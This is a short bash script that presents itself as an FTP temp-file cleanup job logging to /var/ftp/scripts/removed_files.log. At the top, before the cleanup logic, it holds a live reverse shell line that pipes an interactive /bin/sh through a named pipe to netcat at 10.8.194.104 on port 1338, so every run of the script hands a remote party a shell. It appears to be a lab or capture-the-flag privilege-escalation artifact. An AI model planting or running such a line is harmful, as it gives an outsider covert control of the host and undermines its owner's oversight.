#!/bin/bash

mkfifo /tmp/e; cat /tmp/e|/bin/sh -i 2>&1 |nc 10.8.194.104 1338 > /tmp/e

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    echo ok;
    #for LINE in $tmp_files; do
    #    rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
